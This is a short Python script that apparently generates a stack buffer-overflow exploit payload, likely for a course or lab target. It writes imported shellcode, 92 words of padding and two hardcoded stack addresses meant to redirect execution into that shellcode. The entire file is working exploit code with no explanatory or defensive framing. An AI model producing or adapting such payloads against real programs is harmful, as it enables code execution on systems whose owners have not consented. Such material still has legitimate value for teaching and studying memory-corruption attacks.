import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(shellcode)
for i in range(0, 92):
	sys.stdout.buffer.write(pack("<I", 0x11))

sys.stdout.buffer.write(pack("<I", 0xbffe85a8))
sys.stdout.buffer.write(pack("<I", 0xbffe8535))



